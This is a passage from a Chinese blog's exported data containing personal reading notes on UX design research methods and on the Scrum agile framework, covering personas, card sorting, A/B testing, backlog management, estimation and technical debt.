收集数据：最好安排3名测试者，一名专门负责记录，一名负责深度访谈，一名负责观察受试者； 数据处理&#x2F;分析&#x2F;解释：可以通过POEMS框架对受试者的交互行为做标签（POEMS：人&#x2F;物&#x2F;环境&#x2F;消息&#x2F;服务）；第二章 调研分析 数量对比分析 数量之间的关系包括：大小关系、占比关系、趋势变化、相关性； 表现方式： 表格：由行、列、单元格组成，可以丰富的容纳数据，并通过排序&#x2F;筛选&#x2F;数据透视表等方法进行统计分析； 图表：以图形化的方式来进行文字描述，直观的表示数据的一种形式； 饼图&#x2F;环状图：主要用来表示占比关系； 柱状图：常用来表示时序关系； 直方图：常用来统计次数，如不同年龄段的数量； 分组长条图：常用于分组内数值的比较； 瀑布图：几个特定数值间的关系； 条形图： 横条图； 排序长条图； 折线图； 折线图：常用于处理连续性数据的变化关系； 点折线图：数据较少，需要强调数据点，以及趋势变化关系； 多重折线图：有利于各数据系列进行整体比较； 散点图：两个变量之间的关联关系； 雷达图：头尾相边的折线图；（可以从多个维度来对比各自的优缺点） 面积图：折线下方填充颜色，比多重折线图看起来更加直观； 气泡图：除了横纵坐标两个维度外，还可以通过气泡面积增加第三个数据维度； 数量大小对比分析： 同一个数据在不同时间点的比较； 不同数据在相同时间点的比较； 不同数据在同一个领域内的比较； 趋势变化对比分析：上升趋势、下降趋势、波动趋势、保持水平不变的趋势； 占比关系对比分析； 相关性的对比分析：正比相关、反比相关、制约相关（某个决定性因素存在时vs不存在时）； 知觉图&amp;鱼骨图 知觉图：不知道怎么绘制出来的专业玩意，忽略它； 鱼骨图：大骨（现象）-小骨（现象的原因）-小小骨（原因的原因）； 五个为什么，追根究底找出深层次的原因； 详细思考一一罗列想到的原因，避免遗漏； 步骤：确认问题，讨论绘制，确认优先级&#x2F;严重程度&#x2F;解决方案； 优点：直观&#x2F;有条理的呈现事情的原因 缺点：需要有了解问题的专家参与；不能呈现问题的优先级； 卡片法 用于对信息进行分类，适用的场合有：导航设计、信息架构设计等；通过分类过程和结果，可体验到目标用户群体迥然不同的心智模型； 优点：可视化、可移动、可沟通；缺点：小样本可能代表性不足、小组讨论可能受成员表达能力的限制； 操作步骤： 准备工作： 卡片：大小合适，既可以写得下内容，又不太大方便单手操作； 数量约30左右；多准备几张空白的； 颜色：如果有不同颜色可以方便进行分类； 场所：方便走动； 参与者：一般6-10人左右比较合适； 纸&#x2F;笔&#x2F;小礼物； 试验过程： 卡片下面写内容（文字建议经过讨论使其尽量容易理解）、背面写序号以方便统计； 介绍规则； 参与者进行分类：可单独进行，也可分小组进行； 研究者进行观察，如果有疑问可进行解答，必要的时候可以修改卡片文字以促进理解； 分类结束后，回顾自己的分类过程，如果有不清晰的地方可以重新思考一下； 确定分类后，可以让参与者讲一下分类逻辑； 感谢，发礼物； 注意事项： 尽量让真实用户来参与，相对研究者自己参与，会更有启发性； 不需要参与者分类严谨而合乎逻辑，而鼓励他们跟随自己的感觉走；（我们是为了了解他们的心智模型） 线性Delphi法：虽然比较耗时，但是更具启发性； 先由用户各自独立进行分类； 然后各人介绍、解释自己的分类；他人可以提出疑问，但不允许批评； 之后各人吸取他人的想法后，回去调整自己的方案； 之后再次聚集起来分享各自的想法，并解释自己与众不同的想法与理由； 之后再回去修改，周而复始，直到最后大家的想法趋于一致； 案例：儿童需求研究与儿童房设计 确定目标用户群体，通过访谈了解目标用户一天的行为； 收集数据后，将每一个行为记录到卡片上，进行第1轮关于用户行为的分类； 分类结束后，提炼每一种行为背后的生理和心理需求，再将需求写在新的卡片上，进行第2轮关于用户需求分类； 分类结束后，运用角色法将需求归纳为6类家庭模型； 情景分析法 通过故事的形式生动形象的迅速描绘用户执行任务时的大致情况；目的是为了让相关人员能够对用户的形成统一的认识，了解用户的行为习惯，弄清楚用户的行为，便于产品的进一步改进； 几个应用的场合： 对用户行为的梳理：与观察法、访谈法配合使用； 做为头脑风暴的素材； 用于验证产品方案是否符合用户的习惯； 与角色法配合使用，使得用户的行为路径更加清晰； 操作步骤： 设想归纳一个大概的故事主线； 收集故事的元素： 一个特定的环境与状态； 一个或多个角色（描述他们的动机、能力和知识）； 和角色互动的工具或者物体； 注意事项： 这个场景发生的一系列事件和最后的结果； 用户为达成目标所制定的计划，以及对结果产生的反应； 整理完善用户故事的撰写（某人在某个条件下做了什么为什么最后结果是什么）； 标注情景故事中的要点，包括： 主要行为流程图； 标注故事中的物品以及状态； 标注机会点； 优点：方便大家对用户行为形成统一认识；缺点：虽然形象，但如果操作不当，可能描述并不准确而导致方向搞错； 人物角色法 基于真实人物的目标&#x2F;行为&#x2F;观点&#x2F;动机，综合成一组对典型产品使用者的描述；作用：辅助设计，帮忙设计师跳出“为自己设计”的惯性思维，立足于用户的角度看待问题；时刻提醒关键需求&#x2F;关键任务&#x2F;关键流程；促进团队成员间的沟通和对目标用户的理解； 操作步骤： 发现用户：谁是目标用户？有多少？ 建立假设：思考用户之间的差异是什么； 调研：访谈、观察、问卷、可用性测试；内容：喜欢&#x2F;不喜欢、内在需求、价值倾向、工作环境、工作策略和目标、信息策略和目标； 发现共同模式：是否有重要的标签？是否同等重要？是否有更多的用户群； 构造虚拟角色：基本信息、背景、对待技术的态度、个人特质等； 定义场景：需求在什么样的场景下发生； 创建场景：在既定人物&#x2F;既定条件下使用产品后，会发生什么？ 持续的改进：根据新收集的数据，不断完善角色； 人物模型卡： 基本档案：年龄&#x2F;性别&#x2F;收入&#x2F;职业&#x2F;教育背景&#x2F;照片等（生动合适的照片很重要）； 人格：大五类人格特征（高大上的玩意，暂时不知道怎么整）； 会发生影响的对象：比如用户使用的网络&#x2F;设备&#x2F;软件等； 原型分类和引语（一句能够代表其特质的话）； 技能：IT方面的技能； 用户体验目标：让用户感觉易用&#x2F;安全&#x2F;有趣等； 用户曾经使用过的设备和平台（影响其学习上手速度和可能存在的先入为主的观念）； 使用习惯和兴趣：经常使用的软件有哪些，使用时间有多少，可以用饼图表示比例关系； 哪些必须做&#x2F;哪些不可以做：可以制定一些交互和体验方面和规则； 与品牌和产品的关系：新用户&#x2F;老用户&#x2F;粉丝用户等； 注意：通常设计只能满足1-2个主要角色模型，如果要满足太多角色，可能是反思是否产品定位太模糊宽泛了； 优点：用户越是精确分群，越可以帮忙产品定位清晰，功能差异化，从而实现商业的成功；使得设计人员聚焦主要角色，重点关注用户的目标&#x2F;动机&#x2F;行为&#x2F;观点，使得研发人员有统一的视角； 故事板 通过图画的方式，讲好角色&#x2F;情景&#x2F;故事，优点是更容易有代入感和沉浸感，发现原文字描述所容易忽视的细节； 四个要素：人&#x2F;物&#x2F;场景&#x2F;事件； 步骤：确认角色、构建场景、讲一个故事、画图； 可用性测试 通过原型来测试产品的可用性； 步骤： 整理功能点； 根据功能点创建任务（任务是根据用户的心理过程或心理目标来设计的，所以，在可用性测试之前需要通过观察法和访谈法等方式来搞清楚用户的心理目标）； 大纲和脚本： 大纲是主试人员在做测试时的流程规范，内容包括：任务和功能、记录点、备注等； 脚本是主试人员在测试过程中要讲的台词、要提问的问题、要做的事的一个汇总； 记录纸：记录纸一般由观察员来记，如果没有人手，可以通过事后观看录像来记录，内容主要为客观记录观察到的事项； 数据整理： 收集结果：定性部分（主要描述性的文字内容如用户的操作思路&#x2F;操作理由等）、定量部分（次数、耗时、频率、费用等）； 建立问题卡片：相当于建立JIRA任务，内容可包括：问题类型、问题位置、问题描述、重要程度、问题建议、后续措施等； 问题评级：以下是几个维度 对用户继续使用的影响程度是大还是小； 对用户的感受情绪是重还是轻； 问题在整个产品中是主要问题还是次要问题； 问题影响的时间是长还是短； 正常通过8-10名测试人员，可以发现70%-85%的问题； A&#x2F;B测试 可以通过专门的工具来部署，只要提前设定好不同版本的方案即可，可包括同一个页面上的不同元素，或者设置不同页面的URL； 步骤： 提出问题：想解决什么事情； 提出假设：这个事情的产生可能是由于什么原因引起的； 提出方案：根据假设，设计不同的方案； 部署A&#x2F;B测试：通过专门的工具部署不同的方案； 分析结果报告：验证假设是否正确； 新一轮的循环； 测试的内容：标题、图片、视频、段落文字、按钮、表格、颜色、社会认同和信任、确认页面； 优点：快速、简易、成本低、有专门工具、对比作用明显、变量设置灵活； 缺点：适用可量化的指标，不适用不可量化的指标；只适用短期效果，不方便对比长期效果；无法洞察用户更具体的心理细节； 工具： Google Website Optimizer; A&#x2F;Bingo and Vanity; Visual Website Optimizer; Unbounce and Performable; Verster, SiteSpect, Webtrends Optimizer and Omniture’s Test&Target;（企业级测试工具） 用户点击行为分析 用户点击界面产生的数据，经过分析和挖掘后，得到一些有用的帮助，包括： 判断页面的内容和结构是否符合产品设计的预期（即页面设计了一些功能，但用户操作的时候，是否能够按设计的设想来完成）； 判断用户对页面上的哪些内容感兴趣； 帮助到达该页面的用户更容易找到或者发现他们更容易关注的内容，提高用户的满意度； 相对于眼动跟踪，这种方法更容易实施，成本也比较低，同时数据也不失客观有效； 相对于网页跳转跟踪法，这种方式更倾向于分析用户在单个页面内的微观行为； 实现办法：JS代码，第三方工具等； 实际案例的收获（腾讯应用中心）： 清晰简洁的页面框架更有利于用户观察到页面内容本身，从而让他们更容易注意到和点击他们感兴趣的内容； 整齐而简洁的信息单元轮廓（即格式塔的闭合性），有利于提高用户对该模块的点击可能性；（研究表明，低视觉复杂程度的网页，能够让用户感觉到更愉悦，并带来更高的满意度） 某个模块如果需要展示的内容较多，但又不想让它占用较多的纵向空间，则可以考虑使用动态轮播； 在通过点击数据分析了解到用户更关注哪些内容后，就可以更多的展示相同类别的内容；（量身推荐效果好的原因：相比让用户主动查阅新东西，他们更喜欢去点击他们已有的或生活中已熟悉的事物相关的一些内容） 流量、转化率和跳出率 网站分析：根据网站运营的各项定量指标，分析网站存在的问题和机会； 操作步骤：根据需要的指标预告在网站上设置监控（“埋点”），之后运作一段时间后取得数据； 理念：数据驱动业务！！！（试问：我们做到了没有？） 流量：PV访问次数；UV访问人数（估计是按IP统计）； 转化率：用户到达网站设计的最终目标的比例； 统计办法：网站流量统计的第三方工具、网站日志文件； 提高转化率的办法： 优化网站信息架构和导航，让用户能够方便的找到想要的内容；（往前） 介绍的信息丰富、专业，让同时停留更长时间，同时增加信任感；（当前） 操作流程简单，让用户可以尽快达成浏览网站的目的；（往后） 合同定价和多种推广、营销手段，促使用户快速转换（例如：达成交易）；（大背景） 跳出率：用户通过搜索关键词进入网站，只浏览了一个页面就离开与全部浏览量的比例； 反映对网站不感兴趣的用户的比例，是判断网站质量的重要指标； 降低办法： 导航尽量合理，方便用户访问其他感兴趣的内容； 链接正确友好，避免用户有被欺骗的感觉； 提高网站访问速度：快速、快速、快速，重要的事情说三遍； 网页内容符合用户需要； 做好关联推荐，方便用户了解更多感兴趣的信息； 网站数据分析 一些重要的数据指标： 用户是如何到达网站的 直接流量&#x2F;推介流量&#x2F;搜索流量； 访问数（PV&#x2F;UV）； 用户是如何浏览网站的 平均访问时长； 每次访问页数； 页面停留时间； 网站停留时间 用户在网站的关键行为 目标转化次数； 目标转化率； 每次转化成本； 用户对网站的收益贡献 订单数量； 每订单成本； 收益； 投资回报率； 有多少用户流失：跳出率； 数据分析手段： 网站日志分析； 网页标记法； 第三章 从设计调研到设计洞察 设计调研的流程 只有先确定调研好目标，才好选择合适的调研方法； 调研对应产品不同阶段的大致过程：了解情况、形成方案、选择方案、收集反馈； 制定调研计划的步骤： 弄清楚调研的背景及目的； 出具调研方案：包括确定调研方法、安排调研顺序、选择调研对象、安排调研时间表； 出具调研报告：（定性）包括目的、结论、证据、建议；（定量）建议采用图表的方式，结果比纯数字更加直观；报告提交前，建议先找几个人演示解说，根据反馈意见改进后，再最终定稿； 执行调研过程 产品探索阶段：多采用观察法、访谈法、焦点小组、情境法等； 产品方案阶段：可用性测试、卡片分类法；","categories":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}],"tags":[{"name":"设计","slug":"设计","permalink":"http://example.com/tags/%E8%AE%BE%E8%AE%A1/"}]},{"title":"SCRUM 精髓-敏捷转型指南","slug":"SCRUM 精髓-敏捷转型指南","date":"2015-10-29T11:21:00.000Z","updated":"2024-09-22T23:08:41.984Z","comments":true,"path":"2015/10/29/SCRUM 精髓-敏捷转型指南/","permalink":"http://example.com/2015/10/29/SCRUM%20%E7%B2%BE%E9%AB%93-%E6%95%8F%E6%8D%B7%E8%BD%AC%E5%9E%8B%E6%8C%87%E5%8D%97/","excerpt":"","text":"第一章 引子 Scrum是一种用于开发创新产品和服务的敏捷方式；在每个迭代结束时，团队应当得到一个潜在可发布产品； Scrum适用于复杂域，因为不可预测性多于可预测性；在这种环境下，大量的互动和交流必不可少（繁杂域适合通过专家找到最优解决方案；简单域适合采用标准流水作业方式；混乱域需要能够快速响应立即采取行动的方式；无序域则需尽量摆脱这个域）； Scrum不适用于事务性的工作环境，如客服支持类；这一类型更适合采用看板； 第二章 Scrum框架 角色 产品负责人：负责决定要开发什么，以什么顺序开发； ScrumMaster：负责指导团队在Scrum框架上建立并遵循自己的过程； 开发团队（由几种职位组成的团队，负责产品设计、构建和测试）：负责确定如何交付产品负责人要求的产品； 活动 冲刺规划：故事点或理想天数；任务用小时数； 每日立会：不是用来解决问题，而是检视、同步、适应性的制定每日计划的活动，帮助自组织团队更好的完成自己的工作； 冲刺执行：团队要自己定义自己的任务级工作； 冲刺评审：与业务部门一起，将把刚做完的特性到整体开发工作的背景下进行讨论；每个参与者都能了解现状，都有机会指导下一步的工作，以确保产出最合适的解决方案；经常收到业务部门反馈，可以使Scrum团队进一步理解产品的业务和市场； 冲刺回顾：Scrum团队一起讨论哪些Scrum实践是可行的，哪些是不可行的；重点是为了持续的改进，以便下一个冲刺可以做得更好； 产品列表梳理：整理未完成的待处理事项，优先级排序，为下一次的冲刺做准备； 工件 产品列表：产品特性列表及其优先级； 冲刺列表：产品特性下的任务清单及其小时数； 潜在可交付产品增量； 完成的定义： 最低限度：产出一个完整的产品功能，经过设计、构建、集成、测试并且编写了文档； 最高程度：当业务部门想要交付（部署、发布）时，可以构建出可发布的产品； 备注：不同阶段，定义可以不同；前期以最低限度为主，后期以最高程度为主； 第三章 敏捷原则 可变性和不确定性 积极采用有帮助的可变性：非制造业的固定工艺工序，软件中的每个实例特性的独特性，都可能导致可变性时时发生； 采用迭代和增量开发：迭代-因为可能做错，需要快速调整；增量-可以快速得到验证，而非等到最后一刻； 通过检验、调整、适应和透明来利用可变性：参与创建产品的每一个人都必须能够得到与WIP相关的所有重要信息，透明-&gt;检视-&gt;调整； 同时减少各种形式的不确定因素：不知道做什么、怎么做、为谁做；通过构建-展示-响应-修改，四个环节的循环来减少不确定； 预测和适应； 不到最后时刻，不轻易决定：做决策有成本，不做决策有成本；当后者成本大于前者时，才做决策； 承认无法一开始就把事情做对； 偏好适应性、探索式的方法：通过快速构建原型来获得知识； 用经济合理的方式接受变化：减少库存，一开始不要做太多事，而是做刚好够用的事即可；这样当出现变更时浪费的东西最少； 在预测型事前工作和适应型刚好及时的工作之间做出平衡：前期工作有帮助，但不宜过度，只要能够确认大方向和几个重要的特性即可； 经验认识 快速验证重要的假设：重要的假设力求最少； 利用多个认知循环并行的优势：假设-构建-反馈-检视-调整； 组织工作流程以获得快速反馈； WIP 使用经济合理的批量大小：如果可以的话，尽量偏小一点，即一次性处理的需求应少一点； 识别并管理库存以达到良好的流动：不要制造大量库存，否则可能会是浪费； 关注闲置工作（工作停滞，没人干），而非闲置人员（没活儿干）：关注接力棒，而不是跑步的人；CPU如果100%工作反而降低效率； 考虑延期成本：如果该做的工作未做，导致整个项目延期，其成本远大于闲置人员的浪费，时间也是金钱； 进度 适应实时的信息并重新制定计划；计划用于参考，但更注重实时信息并对计划进行调整； 通过验证工作结果来测量进度：重要的不是开始了多少工作，而是完成了多少对客户有价值的工作； 专注于以价值为中心的交付：价值是通过向客户交付可工作的资产、验证重大假设、获得有价值的认知来实现的； 执行 快速前进，但不匆忙：稳定的节奏往往跑得更快和更远； 以质量为魂：将测试与质量把控内置于每一次冲刺周期中，而非放到最后关头； 选用最小、够用的仪式： 文档要作为产品的一部分交付； 保存重要的讨论、决定或协议，以便大家今后能够想起讨论过的内容和决议； 文档是很有价值的，可以帮助新的团队成员迅速跟进； 行业监管要求提供文档（受监管的行业的业务）； 第四章 冲刺 限定时长，优点： 设定WIP数量限制； 强制排列优先顺序； 展示进度； 避免不必要的完美主义； 促进结束； 增强可预测性； 持续期短，优点： 容易规划； 反馈快； 错误有限； 投入产出比高； 有助于“满血复活”； 检查点多； 一致的持续期，优点： 有节奏感； 简化规划活动； 锁定冲刺目标： 共同承诺； 澄清，而非变更； 注重实效； 异常终止及下一个冲刺的相应调整； 完成的检查列表； 设计评审完成； 代码完成； 代码重构完成； 代码是标准格式； 代码已加注释； 代码已提交； 代码已检查； 最终用户文档已更新； 测试完成； 完成单元测试； 完成集成测试； 完成回归测试； 完成平台测试； 完成语言测试； 零已知缺陷； 完成接收测试； 已在生产服务器上线； 完成的定义：需包含接收标准，产生一个潜在可发布的产品增量，达到大家所认可完成定义相一致的程度； 第五章 需求与用户故事 事实：需求一开始无法全部清楚，如果一开始投入太多时间整理需求，可能在后面变更的时候，发现前面的时间浪费掉了；所以，更建议让需求在过程中逐步细化； 用户故事的目的是为了帮忙业务人员和开发人员都能理解需求，如果目的能够达到，格式反而次要； 故事的3C： 卡片：做为（角色），我想（目标），这样可以（利益）（注：写出需求的目的很重要，因为同样的目的，实现的方式有多种）； 对话：口头交流进一步探讨确认需求的细节； 确认：需求的满意条件，或者接受标准；（写出来有利于开发人员评估实现难度，以及测试人员清楚验收标准） 需求的几个抽象级别：史诗（月）、特征（周）、主题（周）、故事（天）、任务（小时）； 好故事的INVEST原则：独立、可协商、有价值、可估算、大小合适、可测试；（如果一个技术故事产品负责人认为没有价值，则不应列入产品列表） 非功能性需求更多应列入完成定义或者接受标准中； 知识获取型故事：获取该信息的成本vs失败重来的成本*0.5；快速失败策略； 收集故事 用户故事写作研讨会： 定义角色–史诗–故事； 直接头脑风暴； 总结：故事是一种占位符，提供了对话的起源；故事有抽象级别，随进度从大往小细化； 第六章 产品列表 概述：有优先顺序的一些特征、在团队成员中共享； 类型：特性、变更、缺陷、技术改进、知识获取； 四个特征DEEP：详略得当、经过估算、有优先顺序、涌现的； 梳理：确立PBI、细化PBI、估算PBI、排序PBI； 由谁梳理：团队成员一起，包括内部&#x2F;外部利益干系人、产品负责人、开发团队；最终决策者：产品负责人； 何时梳理：定时梳理，减少协调时间的成本；其次考虑冲刺过程中穿插进行；确保梳理活动紧密集成到SCRUM过程中更重要；（在冲刺评审后梳理较好，这样团队从业务成员那边得到的反馈，有助于梳理的进行） 就绪的定义： 清楚的表达业务价值； 有开发团队能够理解的足够细节，以便能针对是否能够完成PBI做出明智的判断； 已经识别出依赖关系，不存在阻碍PBI完成的外部依赖关系； 完成PBI所需要的人手齐备； PBI估算后足够小到很容易在一个冲刺中完成； 接收标准定义清晰并且是可测试的；（或者叫满意条件，听起来更生动易理解） 性能标准定义清晰并且是可测试的； SCRUM团队很清楚在冲刺评审的时候如何演示PBI； 版本工作流：将PBI分成必须有的、最好有的、不会有的等三类； 冲刺工作流：需求通过管道流入冲刺；如果团队在每个冲刺可以完成5个PBI，则任何时刻需要有10-15个PBI是准备就绪的；（如果没有意味着什么？涌没有出现？用户需求和用户体验没有进一步调研与改善？） 产品列表原则：一个团队、一个产品列表；产品是有价值、客户愿意花钱购买、我们也愿意打包出售的；如果团队成员可交换，那么可以多个团队一个产品列表；如果一个团队多个产品，那么也是一个产品列表； 第七章 估算与速率 估什么： 产品组合规划：以尺码数来估，用于评估大致需要投入的资源，S&#x2F;M&#x2F;L&#x2F;XL； 产品列表估算：以理想天数或点数来估，用于安排冲刺；估算的首要价值是在估算交流过程中获得的认知（暴露假设和不同意见）； 任务估算：理想小时； PBI估算的原则： 团队估算：产品负责人不估，而是负责阐释说明PBI；Scrummaster主持会议不估；实际动手设计、构建并测试的开发团队成员来估算； 估算不是承诺：估算应该靠谱，不能因为外因而人工放大； 要准确，而不是精确：为了获得精确而付出的努力是一种浪费时间； 使用相对值，而不是绝对值：人们在有参照物的情况下，更容易评估相对值，而非绝对值； 规划扑克的规则： 产品负责人选择一个PBI，阐释给团队听； 团队成员开始讨论，并提出问题，产品负责人回答问题； 每个估算者选择一张牌代表他的估算； 所有人都做出自己的选择后，一起同时亮牌； 如果大家的牌一样，表示达成共识，共识的数字就是PBI的估算； 如果估算不同，成员开始讨论；通过让最低和最高的人解释说明他们的估算是合理的； 讨论之后，返回第3个步骤；重复上述步骤直到达成共识； 规划扑克的好处：激发的PBI相关热烈讨论更有价值，因为要确保团队成员充分了解PBI； 速率最好用范围来表示，不必要过于精确； 提高速率的方法： 引入新工具； 加强培训； 改变团队组成；（谨慎，随意调换很可能导致速率下降） 速率的目的是为了准确计划和自我改进，千万不要将其与团队考核绑定在一起，不然会导致失去准确性和估算膨胀；（团队考核应该以什么做为依据呢？是否可以以交付的客户价值？）（或许我们应该反过来思考，什么样的团队才是一个好团队？按时、按质的交付客户价值？良好的沟通、令人开心的氛围？成就感？互相支持？） 第八章 技术债 技术债的概念：既指我们有意选择的捷径，又指许多损害软件系统的不良实践，具体如下： 技术债的分类： 低级的：一般可以通过培训加强能力来解决； 不可避免的：因为项目本身不可预测性而产生的； 策略性的：明知故犯的，因为某些短期利益而造成的； 技术债的后果： 爆发点不可预期； 交付时间延长； 缺陷数量可观； 技术债的原因： 如期完工的压力； 试图以错误的方式提高速率； 试图减少测试以提高速度； 技术债管理办法： 使用良好的技术实践，例如：简洁设计、测试驱动开发、持续集成、自动化测试、重构； 使用强完成定义； 正确理解技术债的经济成本； 让技术债在业务层面和技术层面都可见； 有债就还，分期偿还，优先偿还高利息的债务、边交付客户价值边偿还； 第九章 产品负责人 主要职责： 管理经济效益（版本层面、冲刺级别、产品列表）； 参与规划（组合规划、产品规划、版本规划、冲刺规划）； 梳理产品列表（PBI的建立、细化、估算、排序等）； 定义接受标准并验证（PBI是否满足要求，最终应当由产品负责人判断）； 与开发团队协作（必须经常与开发团队保持紧密协作）； 与利益干系人协作（集思广益、形成一个统一的愿景来指导产品开发工作）； 特征和技能： 领域能力（有预见性、能有效建立愿景）； 人际交往能力（擅长谈判以达成一致意见、有效传递信息、易于沟通）； 决策力（必须放权让产品负责人制定决策）； 责任心； 日常工作内容： 规划、构想、获批资金； 制定概要产品列表； 与团队估算PBI； 给产品列表排序； 制定版本计划； 制定冲刺计划； 回答团队成员疑问； 梳理产品列表； 参加冲刺评审和冲刺回顾； 谁来当产品负责人： 内部开发：受益的业务部门的代表； 商业开发：用户的内部代理人，一般是产品经理； 外包开发：甲方的业务代表； 组件开发：开发团队的技术代表（能够排序）； 第十章 ScrumMaster 主要职责： 教练：辅导团队成员更好的开展Scrum实践； 服务型领导； 过程权威：带领团队成员定义、遵守流程； 保护伞：保护团队免受外部干扰，让团队成员可以集中精力应付冲刺； 清道夫：扫除妨碍团队生产效率的一切障碍，比如一些服务器问题等等； 变革代言人：带领大家转变思维和突破观念障碍； 特征和技能： 见多识广：懂一点技术，懂一点业务； 善于提问：运用教练技能，结合流程、业务和技术方面的知识，提出重要的和有启发性的问题； 有耐心：即使知道答案，也懂得保持沉默，让团队找到解决方案； 有协作精神； 保护团队：防外部干扰，防内部成员掉队； 公开透明； 日常工作内容： 组织会议：包括规划会议、冲刺计划、冲刺评审、冲刺回顾、每日例会； 教授技能：辅导不熟悉Scrum流程的队员； 梳理产品列表：与产品负责人一起； 扫除障碍； 谁来担任这个角色：来自有技术背景的人，最好全职投入（如果不行，可兼职多个产品的Master）、避免让产品负责人担任（避免利益冲突）； 第十一章 开发团队 由于每个冲刺都会产生一个或多个功能切片，所以它需要涉及到所有岗位职责的人员，包括设计、开发、测试等；偶尔的少数时候，才需要专门成立团队外的测试小组，但大多数都不需要； 主要职责： 冲刺执行：设计、开发、测试等工作； 每日检视与调整； 梳理产品列表（协助产品负责人，但不占用超过10%的时间）； 冲刺规划； 检视与调整产品与过程（冲刺评审、冲刺回顾）； 特征与技能： 自组织； 跨职能的多样化与全面化（关注不要让事闲着，而不要关注人；让有经验的成员教授无经验的成员来处理闲着的事情）； T型技能：广度与深度的结合，加强团队内的技能培训，让每一个人成长为广度层面的多面手； 火枪手态度：塑造集体荣誉感，出了问题，全员负责，没有谁可以置身事外； 沟通广泛：从多角度倾听意见，有利于更清楚的分析问题； 透明沟通； 规模适中（一般是5-9人，小团队效率更高，协调时间较少，弱化社会惰化现象，避免过分专业化，全员参与）； 第十二章 Scrum团队结构 为了组件复用，对于大型项目，很多公司倾向于采用组件团队，但考虑相互依赖的成本，SCRUM倾向于以特性团队为主，组件团队为辅； 如果确实有必要设立组件团队，那么建议再设立一层特性团队，并从组件团队中安排人员一起参与其中，以便有部分成员跨两边的团队，解决沟通成本的问题； 几个办法： 减少并行产品的开发； 培训更多的组件领域专长的人员； 推动共享代码所有权（培训、开源培训）； 多团队之间的协调： SoS（Scrum of Scrum）：即每个Scrum团队选出一名能够表述清楚相互依赖关系的成员，参加上一级的会议； 版本火车定义：按照一个共同的节奏协调跨团队的合作，使多个团队间的愿景、规划和相互依赖关系保持一致； 发布日期是固定的（日期固定、质量固定、范围可变）； 各团队的迭代长度相同； 建立大小适中的、全局的、客观的里程碑； 在顶层、系统级以及特征和组件级做持续的集成； 版本增量可以定期提交客户进行预审、内部评审和系统级的QA； 系统级固化迭代，用于减少技术债并为特殊的版本级验证和测试提供时间； 对于构建类似构件的团队，某些特定的基础设施组件（接口、系统开发工具箱、公用的安装程序和许可证工具、用户体验框架、数据和WEB服务等）一般都必须提前准备就绪； 版本火车操作方式： 准备一个大会议室，所有Scrum团队分位置做下； 产品总负责人介绍下一版本PSI的增量特性； 特性领域负责人轮流介绍各自领域的特性情况； 各SCRUM团队做特性的冲刺映射；不同团队之间进行交流，确保相互依赖关系能够解决； 执行冲刺； 冲刺结束后，对放入版本火车的所有东西进行PSI评审； 冲刺回顾，重点关注如何让今后的版本火车更加有效； 第十三章 经理 经理的职责： 塑造团队： 提供鼓舞人心的目标； 组建团队、招聘解聘团队成员； 授权团队：7级授权，其中3级经理决策（告知、推销、咨询），1级共同决策（商量），3级由团队决策（建议、询问、委托）； 项目经理的职责（由其他4个角色分担了各项职能，一般不必要存在，除非在非常大型的项目中）： 协助大型项目各团队之间的直接高效沟通，扫除沟通障碍； 处理后勤工作； 第十四章 Scrum的规划原则 假设事先无法制定完美计划； 事先规划有帮助，但不宜过度； 最后责任时刻再敲定计划：可以掌握更多的信息；最后时刻：如果再不敲定，成本大于敲定； 关注调整与重新规划胜于遵循计划； 正常管理WIP：不要一开始就创建大量工件库存，而是需要什么再建什么； 提倡更小、更频繁的发布； 计划快速学习并在必要时调头； 第十五章 多层级规划 战略规划：不在讨论范围； 组合规划：先有产品规划后，再来确定如何组合以及开发顺序； 产品规划：愿景、概要产品列表、产品路线图（可选，当采用持续部署的方法时，则可以不用； 如果没有，则有一定作用，即随着时间推移如何增量构建和交付 ）； 版本规划：与冲刺规划的区别在于是否涉及交付，如果冲刺中对完成的定义是以发布为标准的，则二者作用差不多； 冲刺规划； 日常规划； 第十六章 产品组合规划 一个活动，用以确定组合中的哪些工作需要花多少时间以什么的顺序完成； 时间：永无休止的活动，只要有产品在开发，就得做这个工作； 参与者：利益干系人、各产品负责人、高级架构师或技术主管； 流程：进度安排、管理流入、管理流出、管理生产过程； 进度安排策略： 优先考虑生命周期利润：目标是力求利润最大化，当资源有限时，如何安排优先级， 关注两个指标：延期成本、持续时间（有3种组合，对应三种策略，最短任务，最少成本，加权最短任务）； 估算要准确，而非精确（用T恤尺码来估计即可，不管跑出一个量级）； 流入策略： 应用经济过滤器：相对于成本有无更大价值的商机，如果价值不大，则不必再花时间考虑和讨论； 到达率和离开率要平衡：不要塞入太多的产品到列表中，不然会堵车，建议以更频繁的间隔来引入产品； 快速拥抱新涌现的机会； 为更小、更频繁的发布做计划：不要一下子塞一个大产品里来，而应该将它细化成更小的颗粒度； 流出策略： 关注闲置工作，而非闲置人员：不要为了让人不空闲而加了一堆额外的事情进来； 设立WIP限制； 等待整个团队一起行动； WIP策略：边际经济效益，之前都是沉没成本，只关注下一步会有多少边际收益； 四个方向：保留、交付、转向、终止； 特别重要的策略：关注延期成本、更小更频繁发布、WIP限制、边际效益； 第十七章 构想（产品规划） 构想的目的：将原始粗糙的产品想法进行细化，描绘产品的精髓，以便在构想结束后得到足够的信息来决策是否进行下一步的具体开发； 构想的输入： 初始的想法； 时间跨度：即为多远的计划进行规划准备，正常只需要第1个最小特性集的版本即可； 预计构想完成日期； 预算或需要的资源投入； 信心门槛：即得到哪些够用的基本信息后，即可进行决策； 构想的输出： 产品愿景：经常表述为利益干系人如何得到商业价值，有以下几种类型： 进入条件 通过竞争取得平等地垃； 交付最小必须特性； 遵循行业标准； 启动（发力） 瞄准新兴市场； 开始销售其他产品或服务； 差异化 做到与竞争对手有区别； 客户满意； 搅局者 清除与竞争对手的差异； 提高公平竞争的壁垒； 通过改变市场热点来重新定义游戏规划； 缩减成本 缩短上市时间； 减少人员或工时； 提高利润率； 更专、更精； 概要产品列表：以用户故事的形式； 产品路线图：关注最小可发布特性集； 其他一些信息：有助于达到信心阈值的活动都可以进行； 构想的原则：从经济合理的角度构想产品，因为构想本身也需要投入金钱或时间，所以应尽量简化它的过程，能够获得足够做出决策的信息即可，多投入可能是浪费，因为构想获得的信息有太多不确定性； 瞄准一个实际的信心阈值：先定义好需要的最起码的信息及其类型，有了这些信息，决策者就可以有足够的信心做出决策； 关注短期利益：不要一次性做太多的构想，只想第1个版本的最小特性集的那部分内容即可；因为我们的目标是做出第1个最小版本然后让用户去验证； 